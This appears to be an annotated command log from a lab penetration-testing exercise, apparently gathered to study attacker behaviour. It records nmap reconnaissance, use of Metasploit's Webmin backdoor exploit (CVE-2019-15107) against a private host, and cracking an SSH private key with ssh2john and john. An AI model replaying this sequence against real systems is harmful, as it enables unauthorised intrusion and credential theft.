User 73 start time 1594797732 end 1594806064
PADDING
PADDING
PADDING
INPUT|73--0|M0 |1594797732|73|nmap -A 172.18.1.5|OUTPUT
INPUT|73--1|U|1594798040|73|msf|OUTPUT
INPUT|73--2|U|1594798048|73|metasploit|OUTPUT
INPUT|73--3|M2 |1594798192|73|msfconsole|OUTPUT
INPUT|73--4|M3 |1594798376|73|search webmin 1.920|OUTPUT
INPUT|73--5|U|1594798437|73|search cve:2019-15107|OUTPUT
INPUT|73--6|M8 |1594798455|73|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|73--7|M5 |1594798459|73|show options|OUTPUT
INPUT|73--8|A6 |1594798512|73|set TARGETURI=172.18.1.5:10000|OUTPUT
INPUT|73--9|A6 |1594798527|73|set TARGETURI 172.18.1.5:10000|OUTPUT
INPUT|73--10|U|1594798583|73|run|OUTPUT
INPUT|73--11|U|1594798606|73|show options|OUTPUT
INPUT|73--12|A6 |1594798618|73|set TARGETURI /|OUTPUT
INPUT|73--13|A6 |1594798627|73|set RHOST 172.18.1.5|OUTPUT
INPUT|73--14|U|1594798631|73|run|OUTPUT
INPUT|73--15|M6 |1594798677|73|set LHOST 0.0.0.0|OUTPUT
INPUT|73--16|U|1594798683|73|run|OUTPUT
INPUT|73--17|U|1594798744|73|show options|OUTPUT
INPUT|73--18|U|1594798867|73|search edb:47230|OUTPUT
INPUT|73--19|U|1594798877|73|search webmin|OUTPUT
INPUT|73--20|U|1594798916|73|banner|OUTPUT
INPUT|73--21|U|1594798923|73|info|OUTPUT
INPUT|73--22|U|1594799037|73|connect|OUTPUT
INPUT|73--23|U|1594799053|73|run|OUTPUT
INPUT|73--24|U|1594799081|73|show options|OUTPUT
INPUT|73--25|U|1594799177|73|set LHOST 10.1.135.83|OUTPUT
INPUT|73--26|U|1594800875|73|run|OUTPUT
INPUT|73--27|A10 |1594800923|73|ls|OUTPUT
INPUT|73--28|U|1594800945|73|pwd|OUTPUT
INPUT|73--29|A10 |1594800965|73|ls|OUTPUT
INPUT|73--30|A10 |1594801047|73|ls|OUTPUT
INPUT|73--31|A1 A9 A11 A12 A14 A16 A17 |1594801053|73|cat ssh2john.py|OUTPUT
INPUT|73--32|M13 |1594801133|73|python ssh2john.py|OUTPUT
INPUT|73--33|U|1594801313|73|connect|OUTPUT
INPUT|73--34|U|1594801326|73|touch r.txt|OUTPUT
INPUT|73--35|U|1594801354|73|cp /tmp.r.txt rsa_d|OUTPUT
INPUT|73--36|A10 |1594801356|73|ls|OUTPUT
INPUT|73--37|A14 A16 |1594801367|73|python ssh2john.py rsa_d|OUTPUT
INPUT|73--38|A14 A16 |1594801401|73|python ssh2john.py rsa_d > john_rsa|OUTPUT
INPUT|73--39|A14 |1594801408|73|john john_rsa|OUTPUT
INPUT|73--40|A14 |1594801804|73|john rsa_d|OUTPUT
INPUT|73--41|A14 |1594801811|73|john john_rsa|OUTPUT
INPUT|73--42|A14 A16 |1594802026|73|python ssh2john.py /tmp.k > rsa2|OUTPUT
INPUT|73--43|A1 A9 A11 A12 A17 |1594802033|73|cat rsa_d|OUTPUT
